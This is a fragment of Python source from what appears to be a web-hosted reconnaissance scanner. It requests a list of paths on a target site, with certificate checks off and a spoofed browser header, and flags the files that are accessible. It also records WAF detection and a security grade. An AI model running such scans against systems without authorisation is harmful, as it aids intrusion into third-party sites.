        t_url = f"{target_url.rstrip('/')}{path}"
        try:
            res = requests.get(t_url, timeout=3, verify=False, headers={"User-Agent": "Mozilla/5.0"})
            if res.status_code == 200:
                report += f"  🚨 [200 OK] {t_url}\n"
                accessible_files.append(t_url)
            elif res.status_code == 403:
                report += f"  [403 Forbidden] {t_url}\n"
        except: pass

    report += "\n" + "=" * 55 + "\nroot@kali-box:~# Recon Completed Successfully."

    record = {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": target_url,
        "waf": waf,
        "grade": grade,
        "files": accessible_files,
        "full_report": report
    }
    return report, record

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
